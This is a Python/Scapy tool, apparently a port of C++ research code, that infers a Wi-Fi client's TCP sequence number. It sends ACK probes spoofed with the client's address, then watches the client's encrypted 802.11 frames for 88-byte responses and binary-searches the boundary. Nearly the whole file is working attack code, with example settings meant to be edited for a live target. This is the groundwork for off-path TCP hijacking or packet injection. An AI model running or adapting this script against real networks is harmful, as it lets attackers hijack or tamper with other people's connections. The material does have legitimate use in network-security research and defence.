#!/usr/bin/env python3
"""
AckFinder

Original behavior:
- Send TCP ACK probes with chosen seq numbers.
- Sniff Wi-Fi frames for a short window on one or more interfaces.
- If a target 802.11 QoS data frame contains a Raw payload of exactly 88 bytes, treat as "hit".
- Use repeated checks + binary search to locate boundary and compute result.

Requires:
  pip install scapy
Run as root for sniff/send:
  sudo python3 ack_finder.py
"""

from __future__ import annotations

import time
import threading
import random
from dataclasses import dataclass, field
from enum import IntEnum
from typing import List, Optional

from scapy.all import (
    sniff,
    send,
    IP,
    TCP,
    ICMP,
    Raw,
)

# Optional 802.11 layers; Scapy has them, but keep import guarded for portability.
try:
    from scapy.layers.dot11 import Dot11, Dot11QoS  # type: ignore
except Exception:  # pragma: no cover
    Dot11 = None
    Dot11QoS = None


class SeqNextLocation(IntEnum):
    SEQ_NEXT_L = -1
    SEQ_NEXT_W = 0
    SEQ_NEXT_R = 1


@dataclass
class AckFinder:
    # Constructor fields (matching the C++ header)
    client_ip: str = ""
    server_ip: str = ""
    client_port: int = 0
    server_port: int = 0
    send_if_name: str = ""
    sniff_if_name: List[str] = field(default_factory=list)
    client_mac: str = ""
    repeat_num: int = 1

    # Internal state (matching C++ members)
    sack_ack_num: int = 0
    ack_num: int = 0
    sent_seq: int = 0
    sent_seq_left_bound: int = -1
    send_num: int = 0
    send_byte: int = 0
    cost_time: float = 0.0
    send_rate: float = 0.0
    result: int = 0
    target_frame_num: int = 0

    max_uint32: int = 0xFFFFFFFF
    max_uint32_half: int = 0xFFFFFFFF >> 1  # 0x7FFFFFFF

    random_seq: int = 0
    random_ack: int = 0

    # --------------------------
    # Sniffing / packet handling
    # --------------------------
    def capture_packets(self, out_pkts: List, sniff_if_index: int) -> None:
        """
        C++:
          filter: "wlan addr2 " + client_mac
          immediate mode on
          sniff for ~50ms, pushing sniffer.next_packet()
        Python/Scapy:
          sniff(timeout=0.05) and store packets.
        """
        iface = self.sniff_if_name[sniff_if_index]
        bpf = f"wlan addr2 {self.client_mac}"

        # Fallback Python-side filter in case BPF isn't supported
        def lfilter(pkt) -> bool:
            if Dot11 is None or not pkt.haslayer(Dot11):
                return False
            d11 = pkt.getlayer(Dot11)
            # addr2 is the transmitter address in 802.11
            return hasattr(d11, "addr2") and (d11.addr2 or "").lower() == self.client_mac.lower()

        try:
            pkts = sniff(iface=iface, timeout=0.05, store=True, filter=bpf)
        except Exception:
            pkts = sniff(iface=iface, timeout=0.05, store=True, lfilter=lfilter)

        out_pkts.extend(pkts)

    def handle_packets(self, pkts: List) -> None:
        """
        C++ logic:
          target_frame_num = 0
          for each packet:
            if Dot11QoSData present and RawPDU present and RawPDU.size()==88:
                target_frame_num += 1
                return
        """
        self.target_frame_num = 0

        # If Scapy doesn't have 802.11 layers available, we can't match
        if Dot11QoS is None:
            return

        for pkt in pkts:
            try:
                if pkt.haslayer(Dot11QoS) and pkt.haslayer(Raw):
                    raw_layer = pkt.getlayer(Raw)
                    raw_load = bytes(getattr(raw_layer, "load", b""))
                    if len(raw_load) == 88:
                        self.target_frame_num += 1
                        return
            except Exception:
                continue

    # --------------------------
    # Probing logic
    # --------------------------
    def check_seq_list(self, seq_list: List[int]) -> None:
        if not seq_list:
            self.target_frame_num = 0
            print("[*] Warning: the seq_list is empty")
            return

        # Build send_list of IP/TCP/Raw packets
        send_list = []
        for sq in seq_list:
            pkt = IP(src=self.client_ip, dst=self.server_ip) / TCP(
                sport=self.client_port,
                dport=self.server_port,
                flags="A",          # ACK
                seq=int(sq) & 0xFFFFFFFF,
                ack=int(self.random_ack) & 0xFFFFFFFF,
            ) / Raw(b"AAAA")

            for _ in range(self.repeat_num):
                send_list.append(pkt)

        self.send_num += len(send_list)
        for pkt in send_list:
            self.send_byte += len(bytes(pkt))

        # Start sniff threads (one per sniff interface)
        sniff_pkts_vec: List[List] = [[] for _ in self.sniff_if_name]
        threads: List[threading.Thread] = []
        for i in range(len(sniff_pkts_vec)):
            t = threading.Thread(target=self.capture_packets, args=(sniff_pkts_vec[i], i), daemon=True)
            threads.append(t)
            t.start()

        time.sleep(0.005)  # 5ms like C++

        # Send probes
        for pkt in send_list:
            send(pkt, iface=self.send_if_name, verbose=False)

        time.sleep(0.05)  # 50ms like C++

        # "Avoid long sniffing time due to loss of probe packets/responses"
        add_ip = "8.8.8.8"
        add_pkt = IP(src=self.client_ip, dst=add_ip) / ICMP(type="echo-request")
        for _ in range(2):
            send(add_pkt, iface=self.send_if_name, verbose=False)

        # Join sniff threads
        for t in threads:
            t.join(timeout=1.0)

        # Merge sniffed frames
        merged = []
        for v in sniff_pkts_vec:
            merged.extend(v)

        self.handle_packets(merged)

    def seq_check(self, sq: int) -> SeqNextLocation:
        seq_next_left = 0
        check_line = 1
        check_sum = 2

        for _ in range(check_sum):
            self.check_seq_list([int(sq) & 0xFFFFFFFF])
            if self.target_frame_num > 0:
                seq_next_left += 1
                if seq_next_left >= check_line:
                    return SeqNextLocation.SEQ_NEXT_L

        return SeqNextLocation.SEQ_NEXT_R

    def find_sent_seq(self) -> None:
        self.sent_seq = int(self.random_seq)

        location = self.seq_check(self.sent_seq)

        if location == SeqNextLocation.SEQ_NEXT_R:
            self.sent_seq -= self.max_uint32_half
            if self.sent_seq < 0:
                # NOTE: This mirrors the C++ exactly (even though true mod-2^32 wrap would add 2^32).
                self.sent_seq += self.max_uint32

        print(f"[+] Find a sent seq: {self.sent_seq}")

    def find_seq_exact(self) -> None:
        print("++++++++++ Try to find the ACK in window: ++++++++++")
        self.find_sent_seq()

        rb = int(self.sent_seq)
        lb = rb - int(self.max_uint32_half)
        ans = -1

        while rb >= lb:
            mid = (rb + lb) // 2

            if mid < 0:
                seq_mid = int(mid + self.max_uint32) & 0xFFFFFFFF
            else:
                seq_mid = int(mid) & 0xFFFFFFFF

            check = self.seq_check(seq_mid)

            if check == SeqNextLocation.SEQ_NEXT_L:
                ans = mid
                rb = mid - 1
            else:
                lb = mid + 1

        self.sent_seq_left_bound = ans if ans >= 0 else ans + self.max_uint32
        self.result = int(self.sent_seq_left_bound + self.max_uint32_half) & 0xFFFFFFFF

        print(f"[+] Find the sent seq left bound: {self.sent_seq_left_bound}, the seq next: {self.result}")

    # --------------------------
    # Public API
    # --------------------------
    def run(self) -> None:
        time_start = time.time()

        self.send_num = 0
        self.send_byte = 0
        self.sent_seq_left_bound = -1
        self.result = 0

        self.random_seq = random.randint(0, self.max_uint32)
        self.random_ack = random.randint(0, self.max_uint32)

        self.find_seq_exact()

        time_end = time.time()
        self.cost_time = float(time_end - time_start)
        self.send_rate = (float(self.send_byte) / self.cost_time) if self.cost_time > 0 else 0.0

        print(f"Find the client side seq next, server side accepted acknowledgement num: {self.result}")
        print(f"Send Packets: {self.send_num}")
        print(f"Send Bytes: {self.send_byte} (Bytes)")
        print(f"Cost Time: {self.cost_time} (s)")
        print(f"Send Rate: {self.send_rate} (Byte/s)")

    def write_data(self, path: str = "ack_data.txt") -> None:
        with open(path, "a", encoding="utf-8") as f:
            f.write(f"{self.cost_time} {self.send_rate} {self.send_byte} {self.send_num}\n")

    def get_result(self) -> int:
        return int(self.result)


# Example usage (edit values to match your setup):
if __name__ == "__main__":
    af = AckFinder(
        client_ip="10.0.0.2",
        server_ip="10.0.0.1",
        client_port=12345,
        server_port=80,
        send_if_name="eth0",
        sniff_if_name=["wlan0mon"],   # monitor-mode interface(s) for 802.11 sniffing
        client_mac="aa:bb:cc:dd:ee:ff",
        repeat_num=1,
    )
    af.run()
    af.write_data()
